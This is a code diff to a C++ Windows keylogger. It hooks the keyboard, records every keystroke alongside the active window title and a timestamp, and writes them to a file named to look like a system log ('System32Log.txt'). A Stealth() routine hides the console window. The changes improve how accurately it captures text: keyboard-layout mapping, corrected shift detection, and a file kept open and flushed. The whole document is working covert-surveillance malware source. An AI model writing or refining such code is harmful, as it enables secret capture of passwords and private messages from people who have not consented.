@@ -2,6 +2,7 @@
 #include <time.h>
 #include <iostream>
 #include <cstdio>
+#include <fstream>
 
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
@@ -15,7 +16,8 @@ HHOOK _hook;
 // it contains the thing you will need: vkCode = virtual key code.
 KBDLLHOOKSTRUCT kbdStruct;
 
-int Save(int key_stroke, char *file);
+int Save(int key_stroke);
+std::ofstream OUTPUT_FILE;
 
 extern char lastwindow[256];
 
@@ -32,7 +34,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
 			
 			// save to file
-			Save(kbdStruct.vkCode, "System32Log.txt");
+			Save(kbdStruct.vkCode);
 		}
 	}
 
@@ -57,19 +59,22 @@ void ReleaseHook()
 	UnhookWindowsHookEx(_hook);
 }
 
-int Save(int key_stroke, char *file)
+int Save(int key_stroke)
 {
     char lastwindow[256];
     
 	if ((key_stroke == 1) || (key_stroke == 2))
 		return 0; // ignore mouse clicks
 	
-	
-	FILE *OUTPUT_FILE;
-	OUTPUT_FILE = fopen(file, "a+");
-		
-	
 	HWND foreground = GetForegroundWindow();
+    DWORD threadID;
+    HKL layout;
+    if (foreground) {
+        //get keyboard layout of the thread
+        threadID = GetWindowThreadProcessId(foreground, NULL);
+        layout = GetKeyboardLayout(threadID);
+    }
+
     if (foreground)
     {
         char window_title[256];
@@ -84,7 +89,7 @@ int Save(int key_stroke, char *file)
             char s[64];
             strftime(s, sizeof(s), "%c", tm);
             
-            fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
+            OUTPUT_FILE << "\n\n[Window: "<< window_title << " - at " << s << "] ";
         }
     }
 
@@ -92,58 +97,56 @@ int Save(int key_stroke, char *file)
 	std::cout << key_stroke << '\n';
 
 	if (key_stroke == VK_BACK)
-		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
+        OUTPUT_FILE << "[BACKSPACE]";
 	else if (key_stroke == VK_RETURN)
-		fprintf(OUTPUT_FILE, "%s", "\n");
+		OUTPUT_FILE <<  "\n";
 	else if (key_stroke == VK_SPACE)
-		fprintf(OUTPUT_FILE, "%s", " ");
+		OUTPUT_FILE << " ";
 	else if (key_stroke == VK_TAB)
-		fprintf(OUTPUT_FILE, "%s", "[TAB]");
+		OUTPUT_FILE << "[TAB]";
 	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
-		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
+		OUTPUT_FILE << "[SHIFT]";
 	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
-		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
+		OUTPUT_FILE << "[CONTROL]";
 	else if (key_stroke == VK_ESCAPE)
-		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
+		OUTPUT_FILE << "[ESCAPE]";
 	else if (key_stroke == VK_END)
-		fprintf(OUTPUT_FILE, "%s", "[END]");
+		OUTPUT_FILE << "[END]";
 	else if (key_stroke == VK_HOME)
-		fprintf(OUTPUT_FILE, "%s", "[HOME]");
+		OUTPUT_FILE << "[HOME]";
 	else if (key_stroke == VK_LEFT)
-		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
+		OUTPUT_FILE << "[LEFT]";
 	else if (key_stroke == VK_UP)
-		fprintf(OUTPUT_FILE, "%s", "[UP]");
+		OUTPUT_FILE << "[UP]";
 	else if (key_stroke == VK_RIGHT)
-		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
+		OUTPUT_FILE << "[RIGHT]";
 	else if (key_stroke == VK_DOWN)
-		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
+		OUTPUT_FILE << "[DOWN]";
 	else if (key_stroke == 190 || key_stroke == 110)
-		fprintf(OUTPUT_FILE, "%s", ".");
+		OUTPUT_FILE << ".";
 	else if (key_stroke == 189 || key_stroke == 109)
-		fprintf(OUTPUT_FILE, "%s", "-");
+		OUTPUT_FILE << "-";
 	else if (key_stroke == 20)
-		fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
+		OUTPUT_FILE << "[CAPSLOCK]";
 	else {
-		if (key_stroke >= 96 && key_stroke <= 105)
-		{
-			key_stroke -= 48;
-			}
-		else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
-													// check caps lock
-			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+        char key;
+        // check caps lock
+        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 
-			// check shift key
-			if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 || (GetKeyState(VK_LSHIFT) & 0x0001) != 0 || (GetKeyState(VK_RSHIFT) & 0x0001) != 0) {
-				lowercase = !lowercase;
-			}
+        // check shift key
+        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
+            lowercase = !lowercase;   
+        }
 
-			if (lowercase) key_stroke += 32;
-		}
-		fprintf(OUTPUT_FILE, "%c", key_stroke);
+        //map virtual key according to keyboard layout 
+        key = MapVirtualKeyExA(key_stroke,MAPVK_VK_TO_CHAR, layout);
+        
+        //tolower converts it to lowercase properly
+        if (!lowercase) key = tolower(key);
+		OUTPUT_FILE <<  char(key);
     }
-	// NOTE: Numpad-Keys seem to print as lowercase letters
-
-	fclose(OUTPUT_FILE);
+	//instead of opening and closing file handlers every time, keep file open and flush.
+    OUTPUT_FILE.flush();
 	return 0;
 }
 
@@ -160,6 +163,9 @@ void Stealth()
 
 int main()
 {
+	//open output file in append mode
+    OUTPUT_FILE.open("System32Log.txt",std::ios_base::app);	
+
 	// visibility of window
 	Stealth();
 
